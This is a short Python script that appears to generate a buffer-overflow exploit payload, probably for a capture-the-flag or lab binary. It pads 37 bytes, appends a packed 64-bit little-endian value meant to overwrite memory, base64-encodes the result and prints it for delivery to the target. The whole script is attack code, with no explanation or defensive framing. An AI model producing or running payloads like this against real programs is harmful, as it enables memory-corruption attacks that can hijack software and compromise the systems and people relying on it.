
import sys
import struct
import base64

buf = b'qqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqqq'
buf += struct.pack('<Q', 15495783616491397992)
buf = base64.b64encode(buf)
buf += b'\n'

sys.stdout.buffer.write(buf)
